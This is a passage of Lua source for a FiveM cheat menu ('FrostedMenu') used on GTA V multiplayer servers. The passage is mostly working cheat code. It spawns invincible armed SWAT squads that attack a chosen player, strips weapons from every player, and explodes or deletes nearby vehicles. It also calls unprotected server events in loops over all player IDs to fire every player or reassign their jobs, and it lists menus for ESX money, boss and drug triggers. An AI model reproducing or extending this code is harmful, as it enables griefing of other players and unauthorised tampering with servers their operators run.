                if FrostedMenu.Button('~h~~r~Spawn ~s~Swat army with ~y~AK') then
                    local bQ = 's_m_y_swat_01'
                    local bR = 'WEAPON_ASSAULTRIFLE'
                    for i = 0, 10 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        RequestModel(GetHashKey(bQ))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(bQ)) then
                            local ped =
                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(500)
                                NetToPed(ei)
                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetEntityInvincible(ped, true)
                                SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
                elseif FrostedMenu.Button('~h~~r~Spawn ~s~Swat army with ~y~RPG') then
                    local bQ = 's_m_y_swat_01'
                    local bR = 'weapon_rpg'
                    for i = 0, 10 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        RequestModel(GetHashKey(bQ))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(bQ)) then
                            local ped =
                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(500)
                                NetToPed(ei)
                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetEntityInvincible(ped, true)
                                SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
                elseif FrostedMenu.Button('~h~~r~Spawn ~s~Swat army with ~y~Flaregun') then
                    local bQ = 's_m_y_swat_01'
                    local bR = 'weapon_flaregun'
                    for i = 0, 10 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        RequestModel(GetHashKey(bQ))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(bQ)) then
                            local ped =
                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(500)
                                NetToPed(ei)
                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetEntityInvincible(ped, true)
                                SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
                elseif FrostedMenu.Button('~h~~r~Spawn ~s~Swat army with ~y~Railgun') then
                    local bQ = 's_m_y_swat_01'
                    local bR = 'weapon_railgun'
                    for i = 0, 10 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        RequestModel(GetHashKey(bQ))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(bQ)) then
                            local ped =
                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(500)
                                NetToPed(ei)
                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetEntityInvincible(ped, true)
                                SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
                end
                FrostedMenu.Display()
            elseif
                IsDisabledControlPressed(0, 121) or IsDisabledControlPressed(0, 47) and IsDisabledControlPressed(0, 21) or
                    IsDisabledControlPressed(0, 36)
             then
                if mhaonn then
                    FrostedMenu.OpenMenu('FrostedFlakes')
                else
                    bE()
                end
                FrostedMenu.Display()
            elseif FrostedMenu.IsMenuOpened('TeleportMenu') then
                if FrostedMenu.Button('~h~Teleport to ~g~waypoint') then
                    c6()
                elseif FrostedMenu.Button('~h~Teleport into ~g~nearest ~s~vehicle') then
                    b_()
                elseif FrostedMenu.Button('~h~Teleport to ~r~coords') then
                    bT()
                elseif FrostedMenu.Button('~h~Draw custom ~r~blip ~s~on map') then
                    bX()
                elseif
                    FrostedMenu.CheckBox(
                        '~h~Show ~g~Coords',
                        showCoords,
                        function(dR)
                            showCoords = dR
                        end
                    )
                 then
                end
                FrostedMenu.Display()
            elseif FrostedMenu.IsMenuOpened('WeaponMenu') then
                if FrostedMenu.MenuButton('~h~~p~>~s~ Give Single Weapon', 'WeaponTypes') then
                elseif FrostedMenu.Button('~h~~g~Give All Weapons') then
                    for i = 1, #b6 do
                        GiveWeaponToPed(PlayerPedId(-1), GetHashKey(b6[i]), 1000, false, false)
                    end
                elseif FrostedMenu.Button('~h~~r~Remove All Weapons') then
                    RemoveAllPedWeapons(PlayerPedId(-1), true)
                elseif FrostedMenu.Button('~h~Drop your current Weapon') then
                    local ak = GetPlayerPed(-1)
                    local b = GetSelectedPedWeapon(ak)
                    SetPedDropsInventoryWeapon(GetPlayerPed(-1), b, 0, 2.0, 0, -1)
                elseif FrostedMenu.Button('~h~~g~Give All Weapons to ~s~everyone') then
                    for el = 0, 128 do
                        if el ~= PlayerId(-1) and GetPlayerServerId(el) ~= 0 then
                            for i = 1, #b6 do
                                GiveWeaponToPed(GetPlayerPed(el), GetHashKey(b6[i]), 1000, false, false)
                            end
                        end
                    end
                elseif FrostedMenu.Button('~h~~r~Remove All Weapons from ~s~everyone') then
                    for el = 0, 128 do
                        if el ~= PlayerId(-1) and GetPlayerServerId(el) ~= 0 then
                            for i = 1, #b6 do
                                RemoveWeaponFromPed(GetPlayerPed(el), GetHashKey(b6[i]))
                            end
                        end
                    end
                elseif FrostedMenu.Button('~h~Give Ammo') then
                    for i = 1, #b6 do
                        AddAmmoToPed(PlayerPedId(-1), GetHashKey(b6[i]), 200)
                    end
                elseif
                    FrostedMenu.CheckBox(
                        '~h~~r~OneShot Kill',
                        oneshot,
                        function(dR)
                            oneshot = dR
                        end
                    )
                 then
                elseif
                    FrostedMenu.CheckBox(
                        '~h~~g~R~r~a~y~i~b~n~o~b~r~o~g~w ~s~Flare Gun',
                        rainbowf,
                        function(dR)
                            rainbowf = dR
                        end
                    )
                 then
                elseif
                    FrostedMenu.CheckBox(
                        '~h~Vehicle Gun',
                        VehicleGun,
                        function(dR)
                            VehicleGun = dR
                        end
                    )
                 then
                elseif
                    FrostedMenu.CheckBox(
                        '~h~Delete Gun',
                        DeleteGun,
                        function(dR)
                            DeleteGun = dR
                        end
                    )
                 then
                end
                FrostedMenu.Display()
            elseif FrostedMenu.IsMenuOpened('tunings') then
                veh = GetVehiclePedIsUsing(PlayerPedId())
                for i, dE in pairs(bl) do
                    if dE.id == 'extra' and #checkValidVehicleExtras() ~= 0 then
                        if FrostedMenu.MenuButton(dE.name, dE.id) then
                        end
                    elseif dE.id == 'neon' then
                        if FrostedMenu.MenuButton(dE.name, dE.id) then
                        end
                    elseif dE.id == 'paint' then
                        if FrostedMenu.MenuButton(dE.name, dE.id) then
                        end
                    elseif dE.id == 'wheeltypes' then
                        if FrostedMenu.MenuButton(dE.name, dE.id) then
                        end
                    elseif dE.id == 'headlight' then
                        if FrostedMenu.MenuButton(dE.name, dE.id) then
                        end
                    elseif dE.id == 'licence' then
                        if FrostedMenu.MenuButton(dE.name, dE.id) then
                        end
                    else
                        local az = checkValidVehicleMods(dE.id)
                        for ci, dL in pairs(az) do
                            if FrostedMenu.MenuButton(dE.name, dE.id) then
                            end
                            break
                        end
                    end
                end
                if IsToggleModOn(veh, 22) then
                    xenonStatus = 'Installed'
                else
                    xenonStatus = 'Not Installed'
                end
                if FrostedMenu.Button('Xenon Headlight', xenonStatus) then
                    if not IsToggleModOn(veh, 22) then
                        ToggleVehicleMod(veh, 22, not IsToggleModOn(veh, 22))
                    else
                        ToggleVehicleMod(veh, 22, not IsToggleModOn(veh, 22))
                    end
                end
                FrostedMenu.Display()
            elseif FrostedMenu.IsMenuOpened('performance') then
                veh = GetVehiclePedIsUsing(PlayerPedId())
                for i, dE in pairs(bm) do
                    if FrostedMenu.MenuButton(dE.name, dE.id) then
                    end
                end
                if IsToggleModOn(veh, 18) then
                    turboStatus = 'Installed'
                else
                    turboStatus = 'Not Installed'
                end
                if FrostedMenu.Button('~h~~b~Turbo ~h~Tune', turboStatus) then
                    if not IsToggleModOn(veh, 18) then
                        ToggleVehicleMod(veh, 18, not IsToggleModOn(veh, 18))
                    else
                        ToggleVehicleMod(veh, 18, not IsToggleModOn(veh, 18))
                    end
                end
                FrostedMenu.Display()
            elseif FrostedMenu.IsMenuOpened('primary') then
                FrostedMenu.MenuButton('~h~~p~>~s~ Classic', 'classic1')
                FrostedMenu.MenuButton('~h~~p~>~s~ Metallic', 'metallic1')
                FrostedMenu.MenuButton('~h~~p~>~s~ Matte', 'matte1')
                FrostedMenu.MenuButton('~h~~p~>~s~ Metal', 'metal1')
                FrostedMenu.Display()
            elseif FrostedMenu.IsMenuOpened('secondary') then
                FrostedMenu.MenuButton('~h~~p~>~s~ Classic', 'classic2')
                FrostedMenu.MenuButton('~h~~p~>~s~ Metallic', 'metallic2')
                FrostedMenu.MenuButton('~h~~p~>~s~ Matte', 'matte2')
                FrostedMenu.MenuButton('~h~~p~>~s~ Metal', 'metal2')
                FrostedMenu.Display()
            elseif FrostedMenu.IsMenuOpened('rimpaint') then
                FrostedMenu.MenuButton('~h~~p~>~s~ Classic', 'classic3')
                FrostedMenu.MenuButton('~h~~p~>~s~ Metallic', 'metallic3')
                FrostedMenu.MenuButton('~h~~p~>~s~ Matte', 'matte3')
                FrostedMenu.MenuButton('~h~~p~>~s~ Metal', 'metal3')
                FrostedMenu.Display()
            elseif FrostedMenu.IsMenuOpened('classic1') then
                for dK, em in pairs(br) do
                    tp, ts = GetVehicleColours(veh)
                    if tp == em.id and not bg then
                        pricetext = 'Installed'
                    else
                        if bg and tp == em.id then
                            pricetext = 'Previewing'
                        else
                            pricetext = 'Not Installed'
                        end
                    end
                    curprim, cursec = GetVehicleColours(veh)
                    if FrostedMenu.Button(em.name, pricetext) then
                        if not bg then
                            bi = 'paint'
                            bk = false
                            oldprim, oldsec = GetVehicleColours(veh)
                            oldpearl, oldwheelcolour = GetVehicleExtraColours(veh)
                            bh = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour)
                            SetVehicleColours(veh, em.id, oldsec)
                            SetVehicleExtraColours(veh, em.id, oldwheelcolour)
                            bg = true
                        elseif bg and curprim == em.id then
                            SetVehicleColours(veh, em.id, oldsec)
                            SetVehicleExtraColours(veh, em.id, oldwheelcolour)
                            bg = false
                            bi = -1
                            bh = -1
                        elseif bg and curprim ~= em.id then
                            SetVehicleColours(veh, em.id, oldsec)
                            SetVehicleExtraColours(veh, em.id, oldwheelcolour)
                            bg = true
                        end
                    end
                end
                FrostedMenu.Display()
            elseif FrostedMenu.IsMenuOpened('metallic1') then
                for dK, em in pairs(br) do
                    tp, ts = GetVehicleColours(veh)
                    if tp == em.id and not bg then
                        pricetext = 'Installed'
                    else
                        if bg and tp == em.id then
                            pricetext = 'Previewing'
                        else
                            pricetext = 'Not Installed'
                        end
                    end
                    curprim, cursec = GetVehicleColours(veh)
                    if FrostedMenu.Button(em.name, pricetext) then
                        if not bg then
                            bi = 'paint'
                            bk = false
                            oldprim, oldsec = GetVehicleColours(veh)
                            oldpearl, oldwheelcolour = GetVehicleExtraColours(veh)
                            bh = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour)
                            SetVehicleColours(veh, em.id, oldsec)
                            SetVehicleExtraColours(veh, em.id, oldwheelcolour)
                            bg = true
                        elseif bg and curprim == em.id then
                            SetVehicleColours(veh, em.id, oldsec)
                            SetVehicleExtraColours(veh, em.id, oldwheelcolour)
                            bg = false
                            bi = -1
                            bh = -1
                        elseif bg and curprim ~= em.id then
                            SetVehicleColours(veh, em.id, oldsec)
                            SetVehicleExtraColours(veh, em.id, oldwheelcolour)
                            bg = true
                        end
                    end
                end
                FrostedMenu.Display()
            elseif FrostedMenu.IsMenuOpened('matte1') then
                for dK, em in pairs(bt) do
                    tp, ts = GetVehicleColours(veh)
                    if tp == em.id and not bg then
                        pricetext = 'Installed'
                    else
                        if bg and tp == em.id then
                            pricetext = 'Previewing'
                        else
                            pricetext = 'Not Installed'
                        end
                    end
                    curprim, cursec = GetVehicleColours(veh)
                    if FrostedMenu.Button(em.name, pricetext) then
                        if not bg then
                            bi = 'paint'
                            bk = false
                            oldprim, oldsec = GetVehicleColours(veh)
                            oldpearl, oldwheelcolour = GetVehicleExtraColours(veh)
                            SetVehicleExtraColours(veh, em.id, oldwheelcolour)
                            bh = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour)
                            SetVehicleColours(veh, em.id, oldsec)
                            bg = true
                        elseif bg and curprim == em.id then
                            SetVehicleColours(veh, em.id, oldsec)
                            SetVehicleExtraColours(veh, em.id, oldwheelcolour)
                            bg = false
                            bi = -1
                            bh = -1
                        elseif bg and curprim ~= em.id then
                            SetVehicleColours(veh, em.id, oldsec)
                            SetVehicleExtraColours(veh, em.id, oldwheelcolour)
                            bg = true
                        end
                    end
                end
                FrostedMenu.Display()
            elseif FrostedMenu.IsMenuOpened('metal1') then
                for dK, em in pairs(bu) do
                    tp, ts = GetVehicleColours(veh)
                    if tp == em.id and not bg then
                        pricetext = 'Installed'
                    else
                        if bg and tp == em.id then
                            pricetext = 'Previewing'
                        else
                            pricetext = 'Not Installed'
                        end
                    end
                    curprim, cursec = GetVehicleColours(veh)
                    if FrostedMenu.Button(em.name, pricetext) then
                        if not bg then
                            bi = 'paint'
                            bk = false
                            oldprim, oldsec = GetVehicleColours(veh)
                            oldpearl, oldwheelcolour = GetVehicleExtraColours(veh)
                            bh = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour)
                            SetVehicleExtraColours(veh, em.id, oldwheelcolour)
                            SetVehicleColours(veh, em.id, oldsec)
                            bg = true
                        elseif bg and curprim == em.id then
                            SetVehicleColours(veh, em.id, oldsec)
                            SetVehicleExtraColours(veh, em.id, oldwheelcolour)
                            bg = false
                            bi = -1
                            bh = -1
                        elseif bg and curprim ~= em.id then
                            SetVehicleColours(veh, em.id, oldsec)
                            SetVehicleExtraColours(veh, em.id, oldwheelcolour)
                            bg = true
                        end
                    end
                end
                FrostedMenu.Display()
            elseif FrostedMenu.IsMenuOpened('classic2') then
                for dK, em in pairs(br) do
                    tp, ts = GetVehicleColours(veh)
                    if ts == em.id and not bg then
                        pricetext = 'Installed'
                    else
                        if bg and ts == em.id then
                            pricetext = 'Previewing'
                        else
                            pricetext = 'Not Installed'
                        end
                    end
                    curprim, cursec = GetVehicleColours(veh)
                    if FrostedMenu.Button(em.name, pricetext) then
                        if not bg then
                            bi = 'paint'
                            bk = false
                            oldprim, oldsec = GetVehicleColours(veh)
                            bh = table.pack(oldprim, oldsec)
                            SetVehicleColours(veh, oldprim, em.id)
                            bg = true
                        elseif bg and cursec == em.id then
                            SetVehicleColours(veh, oldprim, em.id)
                            bg = false
                            bi = -1
                            bh = -1
                        elseif bg and cursec ~= em.id then
                            SetVehicleColours(veh, oldprim, em.id)
                            bg = true
                        end
                    end
                end
                FrostedMenu.Display()
            elseif FrostedMenu.IsMenuOpened('metallic2') then
                for dK, em in pairs(br) do
                    tp, ts = GetVehicleColours(veh)
                    if ts == em.id and not bg then
                        pricetext = 'Installed'
                    else
                        if bg and ts == em.id then
                            pricetext = 'Previewing'
                        else
                            pricetext = 'Not Installed'
                        end
                    end
                    curprim, cursec = GetVehicleColours(veh)
                    if FrostedMenu.Button(em.name, pricetext) then
                        if not bg then
                            bi = 'paint'
                            bk = false
                            oldprim, oldsec = GetVehicleColours(veh)
                            bh = table.pack(oldprim, oldsec)
                            SetVehicleColours(veh, oldprim, em.id)
                            bg = true
                        elseif bg and cursec == em.id then
                            SetVehicleColours(veh, oldprim, em.id)
                            bg = false
                            bi = -1
                            bh = -1
                        elseif bg and cursec ~= em.id then
                            SetVehicleColours(veh, oldprim, em.id)
                            bg = true
                        end
                    end
                end
                FrostedMenu.Display()
            elseif FrostedMenu.IsMenuOpened('matte2') then
                for dK, em in pairs(bt) do
                    tp, ts = GetVehicleColours(veh)
                    if ts == em.id and not bg then
                        pricetext = 'Installed'
                    else
                        if bg and ts == em.id then
                            pricetext = 'Previewing'
                        else
                            pricetext = 'Not Installed'
                        end
                    end
                    curprim, cursec = GetVehicleColours(veh)
                    if FrostedMenu.Button(em.name, pricetext) then
                        if not bg then
                            bi = 'paint'
                            bk = false
                            oldprim, oldsec = GetVehicleColours(veh)
                            bh = table.pack(oldprim, oldsec)
                            SetVehicleColours(veh, oldprim, em.id)
                            bg = true
                        elseif bg and cursec == em.id then
                            SetVehicleColours(veh, oldprim, em.id)
                            bg = false
                            bi = -1
                            bh = -1
                        elseif bg and cursec ~= em.id then
                            SetVehicleColours(veh, oldprim, em.id)
                            bg = true
                        end
                    end
                end
                FrostedMenu.Display()
            elseif FrostedMenu.IsMenuOpened('metal2') then
                for dK, em in pairs(bu) do
                    tp, ts = GetVehicleColours(veh)
                    if ts == em.id and not bg then
                        pricetext = 'Installed'
                    else
                        if bg and ts == em.id then
                            pricetext = 'Previewing'
                        else
                            pricetext = 'Not Installed'
                        end
                    end
                    curprim, cursec = GetVehicleColours(veh)
                    if FrostedMenu.Button(em.name, pricetext) then
                        if not bg then
                            bi = 'paint'
                            bk = false
                            oldprim, oldsec = GetVehicleColours(veh)
                            bh = table.pack(oldprim, oldsec)
                            SetVehicleColours(veh, oldprim, em.id)
                            bg = true
                        elseif bg and cursec == em.id then
                            SetVehicleColours(veh, oldprim, em.id)
                            bg = false
                            bi = -1
                            bh = -1
                        elseif bg and cursec ~= em.id then
                            SetVehicleColours(veh, oldprim, em.id)
                            bg = true
                        end
                    end
                end
                FrostedMenu.Display()
            elseif FrostedMenu.IsMenuOpened('classic3') then
                for dK, em in pairs(br) do
                    _, ts = GetVehicleExtraColours(veh)
                    if ts == em.id and not bg then
                        pricetext = 'Installed'
                    else
                        if bg and ts == em.id then
                            pricetext = 'Previewing'
                        else
                            pricetext = 'Not Installed'
                        end
                    end
                    _, currims = GetVehicleExtraColours(veh)
                    if FrostedMenu.Button(em.name, pricetext) then
                        if not bg then
                            bi = 'paint'
                            bk = false
                            oldprim, oldsec = GetVehicleColours(veh)
                            oldpearl, oldwheelcolour = GetVehicleExtraColours(veh)
                            bh = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour)
                            SetVehicleExtraColours(veh, oldpearl, em.id)
                            bg = true
                        elseif bg and currims == em.id then
                            SetVehicleExtraColours(veh, oldpearl, em.id)
                            bg = false
                            bi = -1
                            bh = -1
                        elseif bg and currims ~= em.id then
                            SetVehicleExtraColours(veh, oldpearl, em.id)
                            bg = true
                        end
                    end
                end
                FrostedMenu.Display()
            elseif FrostedMenu.IsMenuOpened('metallic3') then
                for dK, em in pairs(br) do
                    _, ts = GetVehicleExtraColours(veh)
                    if ts == em.id and not bg then
                        pricetext = 'Installed'
                    else
                        if bg and ts == em.id then
                            pricetext = 'Previewing'
                        else
                            pricetext = 'Not Installed'
                        end
                    end
                    _, currims = GetVehicleExtraColours(veh)
                    if FrostedMenu.Button(em.name, pricetext) then
                        if not bg then
                            bi = 'paint'
                            bk = false
                            oldprim, oldsec = GetVehicleColours(veh)
                            oldpearl, oldwheelcolour = GetVehicleExtraColours(veh)
                            bh = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour)
                            SetVehicleExtraColours(veh, oldpearl, em.id)
                            bg = true
                        elseif bg and currims == em.id then
                            SetVehicleExtraColours(veh, oldpearl, em.id)
                            bg = false
                            bi = -1
                            bh = -1
                        elseif bg and currims ~= em.id then
                            SetVehicleExtraColours(veh, oldpearl, em.id)
                            bg = true
                        end
                    end
                end
                FrostedMenu.Display()
            elseif FrostedMenu.IsMenuOpened('matte3') then
                for dK, em in pairs(bt) do
                    _, ts = GetVehicleExtraColours(veh)
                    if ts == em.id and not bg then
                        pricetext = 'Installed'
                    else
                        if bg and ts == em.id then
                            pricetext = 'Previewing'
                        else
                            pricetext = 'Not Installed'
                        end
                    end
                    _, currims = GetVehicleExtraColours(veh)
                    if FrostedMenu.Button(em.name, pricetext) then
                        if not bg then
                            bi = 'paint'
                            bk = false
                            oldprim, oldsec = GetVehicleColours(veh)
                            oldpearl, oldwheelcolour = GetVehicleExtraColours(veh)
                            bh = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour)
                            SetVehicleExtraColours(veh, oldpearl, em.id)
                            bg = true
                        elseif bg and currims == em.id then
                            SetVehicleExtraColours(veh, oldpearl, em.id)
                            bg = false
                            bi = -1
                            bh = -1
                        elseif bg and currims ~= em.id then
                            SetVehicleExtraColours(veh, oldpearl, em.id)
                            bg = true
                        end
                    end
                end
                FrostedMenu.Display()
            elseif FrostedMenu.IsMenuOpened('metal3') then
                for dK, em in pairs(bu) do
                    _, ts = GetVehicleExtraColours(veh)
                    if ts == em.id and not bg then
                        pricetext = 'Installed'
                    else
                        if bg and ts == em.id then
                            pricetext = 'Previewing'
                        else
                            pricetext = 'Not Installed'
                        end
                    end
                    _, currims = GetVehicleExtraColours(veh)
                    if FrostedMenu.Button(em.name, pricetext) then
                        if not bg then
                            bi = 'paint'
                            bk = false
                            oldprim, oldsec = GetVehicleColours(veh)
                            oldpearl, oldwheelcolour = GetVehicleExtraColours(veh)
                            bh = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour)
                            SetVehicleExtraColours(veh, oldpearl, em.id)
                            bg = true
                        elseif bg and currims == em.id then
                            SetVehicleExtraColours(veh, oldpearl, em.id)
                            bg = false
                            bi = -1
                            bh = -1
                        elseif bg and currims ~= em.id then
                            SetVehicleExtraColours(veh, oldpearl, em.id)
                            bg = true
                        end
                    end
                end
                FrostedMenu.Display()
            elseif FrostedMenu.IsMenuOpened('VehicleMenu') then
                if FrostedMenu.MenuButton('~h~~p~>~s~ ~h~~b~LSC ~s~Customs', 'LSC') then
                elseif FrostedMenu.MenuButton('~h~~p~>~s~ Vehicle ~g~Boost', 'BoostMenu') then
                elseif FrostedMenu.MenuButton('~h~~p~>~s~ Vehicle List', 'CarTypes') then
                elseif FrostedMenu.MenuButton('~h~~p~>~s~ Global Car Trolls', 'GCT') then
                elseif FrostedMenu.MenuButton('~h~~p~>~s~ Spawn & Attach ~s~Trailer', 'MainTrailer') then
                elseif FrostedMenu.Button('~h~Spawn ~r~Custom ~s~Vehicle') then
                    ca()
                elseif FrostedMenu.Button('~h~~r~Delete ~s~Vehicle') then
                    DelVeh(GetVehiclePedIsUsing(PlayerPedId(-1)))
                elseif FrostedMenu.Button('~h~~g~Repair ~s~Vehicle') then
                    cc()
                elseif FrostedMenu.Button('~h~~g~Repair ~s~Engine') then
                    cd()
                elseif FrostedMenu.Button('~h~~g~Flip ~s~Vehicle') then
                    daojosdinpatpemata()
                elseif FrostedMenu.Button('~h~~b~Max ~s~Tuning') then
                    MaxOut(GetVehiclePedIsUsing(PlayerPedId(-1)))
                elseif FrostedMenu.Button('~h~~g~RC ~s~Car') then
                    ce()
                    FrostedMenu.CloseMenu()
                elseif
                    FrostedMenu.CheckBox(
                        '~h~No Fall',
                        Nofall,
                        function(dR)
                            Nofall = dR
                            SetPedCanBeKnockedOffVehicle(PlayerPedId(-1), Nofall)
                        end
                    )
                 then
                elseif
                    FrostedMenu.CheckBox(
                        '~h~Vehicle Godmode',
                        VehGod,
                        function(dR)
                            VehGod = dR
                        end
                    )
                 then
                elseif
                    FrostedMenu.CheckBox(
                        '~h~Speedboost ~g~SHIFT ~r~CTRL',
                        VehSpeed,
                        function(dR)
                            VehSpeed = dR
                        end
                    )
                 then
                end
                FrostedMenu.Display()
            elseif FrostedMenu.IsMenuOpened('GCT') then
                if
                    FrostedMenu.CheckBox(
                        '~h~~r~EMP~s~ Nearest Vehicles',
                        destroyvehicles,
                        function(dR)
                            destroyvehicles = dR
                        end
                    )
                 then
                elseif
                    FrostedMenu.CheckBox(
                        '~h~~r~Delete~s~ Nearest Vehicles/Entity',
                        deletenearestvehicle,
                        function(dR)
                            deletenearestvehicle = dR
                        end
                    )
                 then
                elseif
                    FrostedMenu.CheckBox(
                        '~h~~r~Explode~s~ Nearest Vehicles',
                        explodevehicles,
                        function(dR)
                            explodevehicles = dR
                        end
                    )
                 then
                elseif
                    FrostedMenu.CheckBox(
                        '~h~~p~Fuck~s~ Nearest Vehicles',
                        fuckallcars,
                        function(dR)
                            fuckallcars = dR
                        end
                    )
                 then
                end
                FrostedMenu.Display()
            elseif FrostedMenu.IsMenuOpened('LuaMenu') then
                if FrostedMenu.MenuButton('~h~~p~>~s~ ~r~ESX ~s~Boss', 'ESXBoss') then
                elseif FrostedMenu.MenuButton('~h~~p~>~s~ ~r~ESX ~s~Money', 'ESXMoney') then
                elseif FrostedMenu.MenuButton('~h~~p~>~s~ ~r~ESX ~s~Jobs', 'ESXJobs') then
                elseif FrostedMenu.MenuButton('~h~~p~>~s~ ~r~ESX ~s~Misc', 'ESXCustom') then
                elseif FrostedMenu.MenuButton('~h~~p~>~s~ ~r~ESX ~s~Drugs', 'ESXDrugs') then
                elseif FrostedMenu.MenuButton('~h~~p~>~s~ ~y~VRP ~s~Triggers', 'VRPTriggers') then
                elseif FrostedMenu.MenuButton('~h~~p~>~s~ ~b~Misc ~s~Triggers', 'MiscTriggers') then
                end
                FrostedMenu.Display()
            elseif FrostedMenu.IsMenuOpened('ESXJobs') then
                if FrostedMenu.Button('~h~Fire all players') then
                    for ak = 0, 128 do
                        TriggerServerEvent('NB:destituerplayer', GetPlayerServerId(ak))
                        UnemployedPlayers()
                    end
                elseif FrostedMenu.Button('~h~Set all ~b~Police ~s~Job') then
                    for ak = 0, 128 do
                        TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(ak), 'police', 3)
                        PolicePlayers()
                    end
                elseif FrostedMenu.Button('~h~Set all ~o~Mecano ~s~Job') then
                    for ak = 0, 128 do
                        TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(ak), 'mecano', 3)
                        MecanoPlayers()
                    end
                elseif FrostedMenu.Button('~h~Set all ~y~Taxi ~s~Job') then
                    for ak = 0, 128 do
                        TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(ak), 'taxi', 3)
                        TaxiPlayers()
                    end
                elseif FrostedMenu.Button('~h~Set all ~r~Ambulance ~s~Job') then
                    for ak = 0, 128 do
                        TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(ak), 'ambulance', 3)
                        AmbulancePlayers()
                    end
                elseif FrostedMenu.Button('~h~Set all ~g~Real Estate ~s~Job') then
                    for ak = 0, 128 do
                        TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(ak), 'realestateagent', 3)
                        RealEstateAgentPlayers()
                    end
                elseif FrostedMenu.Button('~h~Set all ~r~Car ~b~Dealer ~s~Job') then
                    for ak = 0, 128 do
                        TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(ak), 'cardealer', 3)
                        CarDealerPlayers()
                    end
                end
                FrostedMenu.Display()
            elseif FrostedMenu.IsMenuOpened('ESXBoss') then
                if FrostedMenu.Button('~c~~h~Mechanic~s~ Boss Menu') then
                    TriggerEvent(
                        'esx_society:openBossMenu',
                        'mecano',
                        function(en, eo)
                            eo.close()
                        end
                    )
                    TriggerEvent(
                        'esx_society:openBossMenu',
                        'mecano',
                        function(en, eo)
                            eo.close()
                        end
                    )
                    TriggerEvent(
                        'esx_society:openBossMenu',
                        'mecano',
                        function(ep, eq)
                            eq.close()
                        end
                    )
                    TriggerEvent(
                        'esx_society:openBossMenu',
